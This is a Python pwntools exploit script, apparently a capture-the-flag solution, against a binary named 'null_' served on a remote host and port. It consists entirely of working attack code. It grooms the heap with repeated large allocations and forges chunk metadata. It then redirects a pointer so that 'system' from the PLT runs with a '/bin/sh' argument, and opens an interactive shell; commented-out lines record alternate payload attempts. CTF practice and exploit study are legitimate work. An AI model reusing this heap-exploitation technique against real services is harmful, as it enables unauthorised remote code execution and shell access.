#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import os

os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
context.log_level="debug"
pwn_file="./null_"
elf=ELF(pwn_file)
context.binary = elf

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn = remote("47.98.50.73", 5000)
    print conn.recvuntil('Give me PoW : ')
    conn.send(raw_input())
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add_chunk(size,block_count,content):
    conn.sendlineafter("Action: ","1")
    conn.sendlineafter("Size: ",str(size))
    conn.sendlineafter("Pad blocks: ",str(block_count))
    if(content == None):
        conn.sendlineafter("Content? (0/1): ","0")
    else:
        conn.sendlineafter("Content? (0/1): ","1")
        conn.recvuntil("Input: ")
        for i in content:
            conn.send(i)
            sleep(0.1)

conn.sendafter("Enter secret password: \n","i'm ready for challenge\n")
conn.recvuntil("exit\n")
for i in range(0x10):
    add_chunk(0x4000,1000,["b"*0x4000])
for i in range(0x4):
    add_chunk(0x4000,1000,["b"*0x4000])
add_chunk(0x4000,86+0x160-1,["b"*0x4000])
add_chunk(0x4000-0xa0,0,["A"*(0x4000-0xa0)])
add_chunk(0x4000, 0, ["A"*0x4000])
for i in range(0x4):
    add_chunk(0x4000,1000,["b"*0x4000])
for i in range(0x10):
    add_chunk(0x4000, 0x100, ["A"*0x4000])
add_chunk(0x4000, 0x41, ["A"*0x4000])
add_chunk(0x4000-0x60, 0, ["A"*(0x4000-0x60-1), "A"*9+p64(0x8000081)])
for i in range(0x20-1):
    add_chunk(0x4000, 0x100, ["A"*0x4000])
add_chunk(0x4000, 215, ["A"*0x4000])
#add_chunk(0x2000, 0, ["A"*0x2000])
add_chunk(0x1f10, 1, ["A"*0x1f10])
add_chunk(0x778, 0, ["A"*0x778])
#add_chunk(0x240, 1, ["A"*0x240])
add_chunk(0x230, 1, ["A"*0x230])
add_chunk(0x98, 0, ["A"*0x20 + p64(0) + p64(0x75) + p64(0x60201d) + 'A'*0x60])
add_chunk(0x68, 0, ["A"*0x68])
add_chunk(0x68, 0, ["/bin/sh\x00".ljust(11), p64(elf.plt['system']).ljust(0x68-11)])
#add_chunk(0x4000, 0, ["A"*0x4000])
#add_chunk(0x180,0,["b"*0x180])
#add_chunk(0x100,0,[
#    "A"*0xff
#    ,"A" + p64(0) + p64(0x301) + p64(0x602800)+p32(0xf3ffca00)])

#add_chunk(0x788+0xf80,0,["a"*(0x787+0xf80), "a" + p64(0x91) + p64(0x602021) + "B"*32])

#add_chunk(0x18,0,["a"*0x17,"a"+p64(0x731)])
#add_chunk(0x4000,0,["c"*0x4000])
#add_chunk(0x2f8,0,["B"*0x2f8])

conn.interactive()
